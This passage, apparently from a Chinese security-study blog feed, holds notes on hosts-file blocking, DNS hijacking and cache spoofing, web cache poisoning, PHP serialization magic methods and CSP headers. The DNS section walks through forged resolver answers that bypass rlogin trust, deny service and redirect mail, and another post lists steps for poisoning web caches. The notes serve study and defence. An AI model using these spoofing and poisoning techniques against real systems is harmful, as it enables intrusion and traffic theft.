NT/2000/XP/2003/Vista/win7：默认位置为%SystemRoot%\system32\drivers\etc\，但也可以改变。<br>有很多网站不经过用户同意就将各种各样的插件安装到你的计算机中，其中有些说不定就是木马或病毒。对于这些网站我们可以利用Hosts把该网站的域名映射到错误的IP或本地计算机的IP，这样就不能访问了。在WINDOWSX系统中，约定127.0.0.1为本地计算机的IP地址, 0.0.0.0是错误的IP地址。<br>如果，我们在Hosts中，写入以下内容：<br>127.0.0.1 # 要屏蔽的网站 A<br>0.0.0.0 # 要屏蔽的网站 B<br>这样，计算机解析域名 A和 B时，就解析到本机IP或错误的IP，达到了屏蔽网站A 和B的目的。</p><p>2．本机DNS劫持<br>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能反应或访问的是假网址。<br>相关内容<br>域名解析的基本原理就是把域名翻译成IP地址，以便计算机能够进一步通信，传递内容和网址等。<br>由于域名劫持往往只能在特定的被劫持的网络范围内进行，所以在此范围外的域名服务器(DNS)能够返回正常的IP地址，高级用户可以在网络设置把DNS指向这些正常的域名服务器以实现对网址的正常访问。所以域名劫持通常相伴的措施——封锁正常DNS的IP。<br>如果知道该域名的真实IP地址，则可以直接用此IP代替域名后进行访问。比如访问百度，你可以直接用百度IP(111.13.100.92)访问。<br>简单的说就是把你要去的地址拦截下来，给你一个错误的地址，或者告诉你你要去的地方去不了，人为的导致你无法到达目的地，一般用于对一些不良网站的封杀或是一些黑客行为。</p><blockquote><p>1&gt;.DNS欺骗<br>在DNS的缓存还没有过期之前,如果在DNS的缓存中已经存在的记录,一旦有客户查询,DNS服务器将会直接返回缓存中的记录.<br>下面我们来看一个例子:<br>一台运行着Linux的Internet主机,并且提供rlogin服务,它的IP地址为123.45.67.89,它使用的DNS服务器(即/etc/resolv.conf中指向的DNS服务器)的IP地址为98.76.54.32,某个客户端(IP地址为38.222.74.2)试图连接到unix主机的rlogin端口,假设unix主机的/etc/hosts.equiv文件中使用的是dns名称来允许目标主机的访问,那么unix主机会向IP为98.76.54.32的DNS服务器发出一个PTR记录的查询:<br>123.45.67.89 -&gt; 98.76.54.32 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: 2.74.222.38.in-addr.arpa PTR<br>IP为98.76.54.32的DNS服务器中没有这个反向查询域的信息,经过一番查询,这个DNS服务器找到38.222.74.2和38.222.74.10为74.222.38.in-addr.arpa.的权威DNS服务器,所以它会向38.222.74.2发出PTR查询:<br>98.76.54.32 -&gt; 38.222.74.2 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: 2.74.222.38.in-addr.arpa PTR<br>请注意,38.222.74.2是我们的客户端IP,也就是说这台机子是完全掌握在我们手中的.我们可以更改它的DNS记录,让它返回我们所需要的结果:<br>38.222.74.2 -&gt; 98.76.54.32 [Answer]<br>NQY: 1 NAN: 2 NNS: 2 NAD: 2<br>QY: 2.74.222.38.in-addr.arpa PTR<br>AN: 2.74.222.38.in-addr.arpa PTR trusted.host.com<br>AN: trusted.host.com A 38.222.74.2<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>当98.76.54.32的DNS服务器收到这个应答后,会把结果转发给123.45.67.98,就是那台有rlogin服务的unix主机(也是我们的目标 :) ),并且98.76.54.32这台DNS服务器会把这次的查询结果缓存起来.<br>这时unix主机就认为IP地址为38.222.74.2的主机名为trusted.host.com,然后unix主机查询本地的/etc/hosts.equiv文件,看这台主机是否被允许使用rlogin服务,很显然,我们的欺骗达到了.<br>在unix的环境中,有另外一种技术来防止这种欺骗的发生,就是查询PTR记录后,也查询PTR返回的主机名的A记录,然后比较两个IP地址是否相同:<br>123.45.67.89 -&gt; 98.76.54.32 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: trusted.host.com A<br>很不幸,在98.76.54.32的DNS服务器不会去查询这个记录,而会直接返回在查询2.74.222.38.in-addr.arpa时得到的并且存在缓存中的信息:<br>98.76.54.32 -&gt; 123.45.67.89 [Query]<br>NQY: 1 NAN: 1 NNS: 2 NAD: 2<br>QY: trusted.host.com A<br>AN: trusted.host.com A 38.222.74.2<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>那么unix主机就认为38.222.74.2就是真正的trusted.host.com了,我们的目的达到了!<br>这种IP欺骗的条件是:你必须有一台Internet上的授权的DNS服务器,并且你能控制这台服务器,至少要能修改这台服务器的DNS记录,我们的欺骗才能进行.<br>2&gt;.拒绝服务攻击 Denial of service<br>还是上面的例子,如果我们更改位于38.222.74.2的记录,然后对位于98.76.54.32的DNS服务器发出2.74.222.38.in-addr.arpa的查询,并使得查询结果如下:<br>因为74.222.38.in-addr.arpa完全由我们控制,所以我们能很方便的修改这些信息来实现我们的目的.<br>38.222.74.2 -&gt; 98.76.54.32 [Answer]<br>NQY: 1 NAN: 2 NNS: 2 NAD: 2<br>QY: 2.74.222.38.in-addr.arpa PTR<br>AN: 2.74.222.38.in-addr.arpa PTR trusted.host.com<br>AN: <a href="http://www.company.com" target="_blank" rel="noopener">www.company.com</a> A 0.0.0.1<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>这样一来,使用98.76.54.32这台DNS服务器的用户就不能访问<a href="http://www.company.com了,因为这个IP根本就不存在" target="_blank" rel="noopener">www.company.com了,因为这个IP根本就不存在</a>!</p><p>3&gt;.偷取服务 Theft of services<br>还是上面的例子,只是更改的查询结果如下:<br>38.222.74.2 -&gt; 98.76.54.32 [Answer]<br>NQY: 1 NAN: 3 NNS: 2 NAD: 2<br>QY: 2.74.222.38.in-addr.arpa PTR<br>AN: 2.74.222.38.in-addr.arpa PTR trusted.host.com<br>AN: <a href="http://www.company.com" target="_blank" rel="noopener">www.company.com</a> CNAME <a href="http://www.competitor.com" target="_blank" rel="noopener">www.competitor.com</a><br>AN: company.com MX 0 mail.competitor.com<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>这样一来,一个本想访问<a href="http://www.competitor.com的用户会被带到另外一个地方,甚至是敌对的公司的主页" target="_blank" rel="noopener">http://www.competitor.com的用户会被带到另外一个地方,甚至是敌对的公司的主页</a>(想想把华为和北电联起来是什么样的感觉. :) ).并且发给company.com的邮件会被发送给mail.compertitor.com.(越来越觉得在网络上的日子不踏实! xxbin这样想).</p><p>4&gt;.限制<br>对这些攻击,也有一定的限制.<br>首先,攻击者不能替换缓存中已经存在的记录.比如说,如果在98.76.54.32这个DNS服务器上已经有一条<a href="http://www.company.com的CNAME记录,那么攻击者试图替换为www.competitor.com将不会成功.然而,一些记录可以累加,比如A记录,如果在DNS的缓存中已经存在一条www.company.com的A记录为1.2.3.4,而攻击者却欺骗DNS服务器说www.company.com的A记录为4.3.2.1,那么www.company.com将会有两个A记录,客户端查询时会随机返回其中一个" target="_blank" rel="noopener">www.company.com的CNAME记录,那么攻击者试图替换为www.competitor.com将不会成功.然而,一些记录可以累加,比如A记录,如果在DNS的缓存中已经存在一条www.company.com的A记录为1.2.3.4,而攻击者却欺骗DNS服务器说www.company.com的A记录为4.3.2.1,那么www.company.com将会有两个A记录,客户端查询时会随机返回其中一个</a>.(呵呵,这不是loading balance么?)<br>其次,DNS服务器有个缓存刷新时间问题,如果<a href="http://www.netbuddy.org的TTL为7200,那么DNS服务器仅仅会把www.netbuddy.org的信息缓存7200秒或者说两个小时.如果攻击者放入一条TLL为604800的A记录,那么这条记录将会在缓存中保存一周时间,过了默认的两天后,这个DNS服务器就会到处&quot;分发&quot;攻击者假造的记录" target="_blank" rel="noopener">www.netbuddy.org的TTL为7200,那么DNS服务器仅仅会把www.netbuddy.org的信息缓存7200秒或者说两个小时.如果攻击者放入一条TLL为604800的A记录,那么这条记录将会在缓存中保存一周时间,过了默认的两天后,这个DNS服务器就会到处&quot;分发&quot;攻击者假造的记录</a>.<br>下面是常用的几种可以累加和不能累加的记录:<br>A can add<br>NS can add<br>MX can add<br>PTR cannot add</p></blockquote><p>原文链接：<a href="https://www.cnblogs.com/blacksunny/p/6910530.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/6910530.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;缓存欺骗原理&quot;&gt;&lt;a href=&quot;#缓存欺骗原理&quot; class=&quot;headerlink&quot; title=&quot;缓存欺骗原理&quot;&gt;&lt;/a&gt;缓存欺骗原理&lt;/h1&gt;&lt;p&gt;定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 &lt;/p&gt;
&lt;p&gt;原理：如果可以冒充域名服务器，然
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>缓存投毒原理</title>
    <link href="http://yoursite.com/2020/06/26/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/06/26/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8E%9F%E7%90%86/</id>
    <published>2020-06-26T12:20:46.448Z</published>
    <updated>2020-06-29T08:53:21.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓存投毒原理"><a href="#缓存投毒原理" class="headerlink" title="缓存投毒原理"></a>缓存投毒原理</h1><p><strong>缓存是什么？</strong></p><p>缓存（cache），原始意义是指访问速度比一般随机存取存储器（RAM）快的一种高速存储器，通常它不像系统主存那样使用DRAM技术，而使用昂贵但较快速的SRAM技术。缓存的设置是所有现代计算机系统发挥高性能的重要因素之一。</p><p>如果服务器必须分别对每个HTTP请求发送新的响应，则可能会使服务器过载，从而导致延迟问题和不良的用户体验，尤其是在繁忙时期。缓存主要是减少此类问题的一种方法。</p><p>缓存位于服务器和用户之间，通常在固定的时间内保存（缓存）对特定请求的响应。如果另一个用户在这段时间内发送了同样的请求，则缓存会直接提供响应的副本(缓存)给用户，而无需与服务器直接进行交互。通过减少服务器对重复请求进行处理的次数，来减轻服务器的负担。<br>如下图就是同时间的用户访问同一个内容时，获取资源的过程。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200427115852-68b8ac64-883b-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115852-68b8ac64-883b-1.png" alt="img"></a></p><p><strong>缓存投毒</strong>，通常也称为域名系统投毒，或DNS缓存投毒。</p><p>缓存投毒通常也称为域名系统投毒，或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上。</p><p>随着恶意软件传播的增多，缓存投毒的方法也层出不穷。典型的一种是发送标题吸引人的垃圾邮件并诱导你去打开（比如标题为“你的退税出现严重问题”）。点击邮件中的图片和广告条幅也会将用户指向被投毒的网站。一旦用户的电脑被恶意代码感染，他今后所有的URL请求都将被自动指向恶意IP地址-哪怕被指向的“受害”服务器已经在其网页上清除了恶意代码。对那些知名或被大众信任的网站来说，缓存投毒是个危险的隐形杀手，比如那些自动更新病毒库时所打开的网页。 </p><p>缓存投毒与另外一种打着管理员或技术支持的幌子通过email来轰炸邮箱的DNS布毒方式不同，缓存投毒是一种URL投毒，或称地址投毒。用户上网时，浏览器的地址栏中会追加一段ID以记录用户浏览过的网页。</p><p><strong>Web缓存投毒攻击产生的影响</strong></p><p>Web缓存投毒的影响在很大程度上取决于两个关键因素：</p><p>1、攻击者可以成功地成功缓存什么</p><p>由于投毒的缓存更多是一种分发手段，而不是独立的攻击，因此Web缓存投毒的影响与注入的payload的危害密不可分。与大多数攻击一样，Web缓存投毒也可以与其他攻击结合使用，以进一步扩大潜在影响。</p><p>2、受影响页面上的通信量</p><p>仅当缓存投毒时，投毒响应才会提供给访问受影响页面的用户。结果，根据页面是否受欢迎，影响可能从不存在到严重不等。例如，如果攻击者设法破坏了主要网站主页上缓存的响应，则该攻击可能会影响成千上万的用户，而无需攻击者进行任何后续交互。</p><p><strong>构造Web缓存投毒攻击的攻击步骤：</strong></p><p>1、识别和评估非关键输入<br>缓存投毒攻击依赖于对unkeyed的操作。在cache中进行判别是否由缓存进行响应时会忽略 unkeyed 的输入。因此我们可以使用 unkeyed 输入进行注入payload来引发投毒响应，如果改响应被缓存，就会提供给具有匹配的 cache key 的其他用户。<br>通过向请求中添加随机输入并对响应进行观察是否被影响来进行识别非关键输入。</p><p>2、引起后端服务器的有害响应<br>识别出非关键输入后，下一步就是准确评估网站的处理方式。理解这一点对于成功引发有害反应至关重要。如果输入未正确清理就反映在服务器的响应中，或者用于动态生成其他数据，则这是Web缓存投毒的潜在入口点。</p><p>3、获取响应缓存<br>操纵输入以引起有害的响应是成功的一半。是否缓存响应取决于所有因素，例如文件扩展名，内容类型，路由，状态代码和响应标头。需要花费一些时间来简单地处理不同页面上的请求并研究缓存的行为。一旦确定了如何缓存包含恶意输入的响应，便可以将漏洞利用传递给潜在的受害者。</p><p><strong>利用Web缓存投毒漏洞</strong></p><p>可以使用web缓存投毒来进行：XSS攻击、利用对资源的不安全导入、利用cookie处理漏洞、利用基于DOM的漏洞。</p><p>原文链接：<a href="https://blog.csdn.net/cookieXSS/java/article/details/106161723" target="_blank" rel="noopener">https://blog.csdn.net/cookieXSS/java/article/details/106161723</a></p><p><a href="https://xz.aliyun.com/t/7696#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7696#toc-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;缓存投毒原理&quot;&gt;&lt;a href=&quot;#缓存投毒原理&quot; class=&quot;headerlink&quot; title=&quot;缓存投毒原理&quot;&gt;&lt;/a&gt;缓存投毒原理&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;缓存是什么？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;缓存（cache），原始意义是指访问速度比一般
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://yoursite.com/2020/05/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2020/05/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-27T07:16:37.592Z</published>
    <updated>2020-07-05T13:51:35.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>序列化和反序列化的概念</p><p>​        把对象转换为字节序列的过程称为对象的序列化。<br>　　把字节序列恢复为对象的过程称为对象的反序列化。</p><p>对象的序列化主要有两种用途：</p><p>　　1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；<br>　　2） 在网络上传送对象的字节序列。</p><p>参考博客：<a href="https://www.cnblogs.com/tsinghuaxiaobao/p/5729706.html" target="_blank" rel="noopener">https://www.cnblogs.com/tsinghuaxiaobao/p/5729706.html</a></p><blockquote><p>序列化概念：</p><p>序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p><p>序列化使其他代码可以查看或修改，那些不序列化便无法访问的对象实例数据。确切地说，代码执行序列化需要特殊的权限：即指定了 SerializationFormatter 标志的 SecurityPermission。在默认策略下，通过 Internet 下载的代码或 Internet 代码不会授予该权限；只有本地计算机上的代码才被授予该权限。</p><p>通常，对象实例的所有<a href="https://baike.baidu.com/item/字段/2885972" target="_blank" rel="noopener">字段</a>都会被序列化，这意味着数据会被表示为实例的序列化数据。这样，能够解释该格式的代码有可能能够确定这些数据的值，而不依赖于该成员的可访问性。类似地，反序列化从序列化的表示形式中提取数据，并直接设置对象状态，这也与可访问性规则无关。</p><p>对于任何可能包含重要的安全性数据的对象，如果可能，应该使该对象不可序列化。如果它必须为可序列化的，请尝试生成特定字段来保存不可序列化的重要数据。如果无法实现这一点，则应注意该数据会被公开给任何拥有序列化权限的代码，并确保不让任何恶意代码获得该权限。</p><p>反序列化<br>将二进制数据换回原对象，构造方法：ObjectInputStream（InputStream in），方法: Object readObject() 从 ObjectInputStream 读取对象</p><pre><code>publicclassDeserialization {publicstaticvoidmain(String[] args) throwsIOException, Exception{File file= newFile(&quot;F:&quot;+File.separator+&quot;serialize.txt&quot;);//反序列化到指定的文本ObjectInputStream ois=newObjectInputStream(newFileInputStream(file));Object obj=ois.readObject();Book book=(Book) obj;System.out.println(&quot;我们通过使用字节流的序列化操作，看到了如下信息内容：\n&quot;+book);ois.close();}}</code></pre></blockquote><p>参考博客：<a href="https://www.cnblogs.com/tr1ple/p/11156279.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11156279.html</a></p><p>1、PHP中序列化与反序列化的函数分别是：serialize(value), unserialize(str)<br>如：</p><pre><code>&lt;?php    //php的序列化与反序列化    //serialize(value)    //unserialize(str)    $arr = array(        &#39;name&#39;=&gt;&#39;xiaoming&#39;,        &#39;sex&#39;=&gt;&#39;男&#39;,        &#39;age&#39;=&gt;20    );    $str    = serialize($arr);    var_dump($str);    $arr2   = unserialize($str);    var_dump($arr2);?&gt;</code></pre><p>　　序列化为的结果为：<br>　　string(67) “a:3:{s:4:”name”;s:8:”xiaoming”;s:3:”sex”;s:3:”男”;s:3:”age”;i:20;}”<br>　　还原后的结果：</p><p>　　array(3) { [“name”]=&gt; string(8) “xiaoming” [“sex”]=&gt; string(3) “男” [“age”]=&gt; int(20) }</p><p>2、序列化的注意点：</p><p>当数组值中包含双引号，单引号或双引号时，会出现一些问题，可以使用base64_encode()与base64_decode()对数据做编码与解码</p><p>参考博客：<a href="https://www.cnblogs.com/luodao1991/p/3812945.html" target="_blank" rel="noopener">https://www.cnblogs.com/luodao1991/p/3812945.html</a></p><p>常见的PHP魔术方法：</p><pre><code>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__toString：当对象被当做一个字符串使用时调用。__sleep:序列化对象之前就调用此方法(其返回需要一个数组)__wakeup:反序列化恢复对象之前调用该方法__call:当调用对象中不存在的方法会自动调用该方法。__get:在调用私有属性的时候会自动执行__isset()在不可访问的属性上调用isset()或empty()触发__unset()在不可访问的属性上使用unset()时触发</code></pre><p>参考博客：<a href="https://www.cnblogs.com/luodao1991/p/3812945.html" target="_blank" rel="noopener">https://www.cnblogs.com/luodao1991/p/3812945.html</a></p><p>一、</p><pre><code>__construct() 和 __destruct()__construct()被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。</code></pre><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814185851146-2079186395.png" alt="img"></p><p>测试：</p><pre><code>class test {    private $flag = &#39;&#39;;    public $filename = &#39;&#39;;    public $data = &#39;&#39;;    function __construct($filename, $data) {        $this-&gt;filename = $filename;        $this-&gt;data = $data;        echo &#39;construct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }}$a = new test(&#39;test.txt&#39;, &#39;data&#39;);</code></pre><p>测试结果：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814190308787-849746794.png" alt="img"></p><p>同样的，我们编写一个类的析构方法，__destruct()</p><p>析构函数的作用：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814190554740-2101728295.png" alt="img"></p><p>代码如下：</p><pre><code>class test {    private $flag = &#39;&#39;;    public $filename = &#39;&#39;;    public $data = &#39;&#39;;    function __construct($filename, $data) {        $this-&gt;filename = $filename;        $this-&gt;data = $data;        echo &#39;construct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    function __destruct() {        echo &#39;destruct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }}$a = new test(&#39;test.txt&#39;, &#39;data&#39;);</code></pre><p>运行结果：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814190455881-983907146.png" alt="img">二、</p><pre><code>__sleep()   __wakeup()   __toString()</code></pre><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814211728646-872838140.png" alt="img"></p><p>测试：</p><pre><code>class test {    private $flag = &#39;&#39;;    # 用于保存重载的数据     private $data = array();    public $filename = &#39;&#39;;    public $content = &#39;&#39;;    function __construct($filename, $content) {        $this-&gt;filename = $filename;        $this-&gt;content = $content;        echo &#39;construct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    function __destruct() {        echo &#39;destruct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    # 反序列化时候触发    function __wakeup() {        // file_put_contents($this-&gt;filename, $this-&gt;data);        echo &#39;wakeup function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    # 一般情况用在序列化操作时候，用于保留数据    function __sleep() {        echo &#39;sleep function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;        return array(&#39;flag&#39;, &#39;filename&#39;, &#39;data&#39;);    }    # 当需要输出得到对象名称时候会调用    function __toString() {        return $this-&gt;data;    }    public function set_flag($flag) {        $this-&gt;flag = $flag;    }    public function get_flag() {        return $this-&gt;flag;    }}$key = serialize(new test(&#39;test.txt&#39;, &#39;test&#39;));var_dump($key);$b = unserialize($key);</code></pre><p>运行结果：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814213555818-482422847.png" alt="img"></p><p>在进行序列化的时候，执行了<code>__sleep()</code>方法，在反序列化的时候执行了<code>__wakeup()</code>方法。</p><p>然后是__toString()方法：</p><pre><code>class test {    private $flag = &#39;&#39;;    # 用于保存重载的数据     private $data = array();    public $filename = &#39;&#39;;    public $content = &#39;&#39;;    function __construct($filename, $content) {        $this-&gt;filename = $filename;        $this-&gt;content = $content;        echo &#39;construct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    function __destruct() {        echo &#39;destruct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    # 当需要输出得到对象名称时候会调用    function __toString() {        return $this-&gt;content;    }}$a = new test(&#39;test.txt&#39;, &#39;data&#39;);echo $a.&quot;&lt;br&gt;&quot;;</code></pre><p>结果：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814214737553-1134269474.png" alt="img"></p><p>三、</p><p><code>__set()   __get()   __isset()   __unset()</code>   作用如下：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814192333631-967052636.png" alt="img"></p><p>我们一样是来写一个代码进行验证：</p><pre><code>class test {    private $flag = &#39;&#39;;    # 用于保存重载的数据     private $data = array();    public $filename = &#39;&#39;;    public $content = &#39;&#39;;    function __construct($filename, $content) {        $this-&gt;filename = $filename;        $this-&gt;content = $content;        echo &#39;construct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    function __destruct() {        echo &#39;destruct function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;    }    function __set($key, $value) {        echo &#39;set function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;        $this-&gt;data[$key] = $value;    }    function __get($key) {        echo &#39;get function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;        if (array_key_exists($key, $this-&gt;data)) {            return $this-&gt;data[$key];        } else {            return null;        }    }    function __isset($key) {        echo &#39;isset function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;        return isset($this-&gt;data[$key]);    }    function __unset($key) {        echo &#39;unset function in test class&#39;;        echo &quot;&lt;br&gt;&quot;;        unset($this-&gt;data[$key]);    }    public function set_flag($flag) {        $this-&gt;flag = $flag;    }    public function get_flag() {        return $this-&gt;flag;    }}$a = new test(&#39;test.txt&#39;, &#39;data&#39;);# __set() 被调用$a-&gt;var = 1;# __get() 被调用echo $a-&gt;var;# __isset() 被调用var_dump(isset($a-&gt;var));# __unset() 被调用unset($a-&gt;var);var_dump(isset($a-&gt;var));echo &quot;\n&quot;;</code></pre><p>运行结果：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814194054396-358365891.png" alt="img"></p><p>我们可以看到调用的顺序为： 构造方法 =&gt; set方法（我们此时为类中并没有定义过的一个类属性进行赋值触发了set方法） =&gt; get方法 =&gt; isset方法 =&gt; unset方法 =&gt; isset方法 =&gt; 析构方法</p><p>同时也可以发现，析构方法在所有的代码被执行结束之后进行的。</p><p>四、</p><p>  <code>__call()   __callStatic()</code>   </p><p>官方文档中的解释：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814210046146-2097402032.png" alt="img"></p><p>类似以上介绍过的<strong>set()和</strong>get()，刚刚是访问不存在或者不可访问属性时候进行的调用。现在是访问不存在或者不可访问的方法时候：</p><p>代码如下：</p><pre><code>class test {    private $flag = &#39;&#39;;    # 用于保存重载的数据     private $data = array();    public $filename = &#39;&#39;;    public $content = &#39;&#39;;    function __call($funcname, $args) {        echo &#39;function name is: &#39; . $funcname. &#39; args is: &#39; . implode(&#39;, &#39;, $args);        echo &quot;&lt;br&gt;&quot;;    }    public static function __callStatic($funcname, $args) {        echo &#39;static function name is: &#39; . $funcname. &#39; args is: &#39; . implode(&#39;, &#39;, $args);        echo &quot;&lt;br&gt;&quot;;    }    public function set_flag($flag) {        $this-&gt;flag = $flag;    }    public function get_flag() {        return $this-&gt;flag;    }}$obj = new test;# 调用一个不存在或者无法访问到的方法时候将会调用__call()$obj-&gt;run(&#39;run args, test&#39;);# 调用一个不存在的静态方法，将会去调用__callStatic()$obj::run(&#39;static test&#39;);</code></pre><p>运行结果：</p><p><img src="https://images2017.cnblogs.com/blog/892186/201708/892186-20170814211405100-441748676.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP反序列化&quot;&gt;&lt;a href=&quot;#PHP反序列化&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化&quot;&gt;&lt;/a&gt;PHP反序列化&lt;/h1&gt;&lt;p&gt;序列化和反序列化的概念&lt;/p&gt;
&lt;p&gt;​        把对象转换为字节序列的过程称为对象的序列化。
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XSS防御之CSP原理学习</title>
    <link href="http://yoursite.com/2020/05/24/XSS%E9%98%B2%E5%BE%A1%E4%B9%8BCSP%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/05/24/XSS%E9%98%B2%E5%BE%A1%E4%B9%8BCSP%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-24T12:00:29.805Z</published>
    <updated>2020-07-12T09:24:42.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS防御之CSP原理学习"><a href="#XSS防御之CSP原理学习" class="headerlink" title="XSS防御之CSP原理学习"></a>XSS防御之CSP原理学习</h1><p>讲得很详细：<a href="https://yq.aliyun.com/articles/87712?utm_campaign=wenzhang&amp;utm_medium=article&amp;utm_source=QQ-qun&amp;201767&amp;utm_content=m_22674" target="_blank" rel="noopener">https://yq.aliyun.com/articles/87712?utm_campaign=wenzhang&amp;utm_medium=article&amp;utm_source=QQ-qun&amp;201767&amp;utm_content=m_22674</a></p><blockquote><p>内容安全策略（CSP），其核心思想十分简单：网站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止的。其被誉为专门为解决XSS攻击而生的神器。</p><p>CSP（Content Security Policy）指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。简单来说，就是我们能够规定，我们的网站只接受我们指定的请求资源。</p><p>CSP 本质上是建立白名单，规定了浏览器只能够执行特定来源的代码；即使发生了xss攻击，也不会加载来源不明的第三方脚本。</p><p>两种方法可以启用 CSP：</p><ul><li>设置 HTTP 的 <code>Content-Security-Policy</code> 头部字段</li><li>设置网页的<meta>标签。</li></ul><h5 id="（1）使用HTTP的-Content-Security-Policy头部"><a href="#（1）使用HTTP的-Content-Security-Policy头部" class="headerlink" title="（1）使用HTTP的 Content-Security-Policy头部"></a>（1）使用HTTP的 <code>Content-Security-Policy</code>头部</h5><p>在服务器端使用 HTTP的 <code>Content-Security-Policy</code>头部来指定你的策略，像这样:</p><pre><code class="undefined">Content-Security-Policy: policy</code></pre><p>policy参数是一个包含了各种描述CSP策略指令的字符串。</p><p>1、只能在指定的域下加载文件，这里表示只能从同域下加载，斜杠为转义符：</p><pre><code>&#39;Content-Security-Policy&#39;: &#39;default-src \&#39;self\&#39;&#39;</code></pre><p>如果要允许请求到这个域，添加进策略即可：</p><pre><code class="rust">&#39;Content-Security-Policy&#39;: &#39;default-src \&#39;self\&#39; https://cdn.bootcss.com/&#39; </code></pre><p>2、上面的策略是无法限制form表单的提交的，这时候就要设置<code>form-action</code>策略：</p><pre><code>&#39;Content-Security-Policy&#39;: &#39;default-src \&#39;self\&#39; https://cdn.bootcss.com/; form-action \&#39;self\&#39;&#39;</code></pre><h5 id="（2）启用违例报告"><a href="#（2）启用违例报告" class="headerlink" 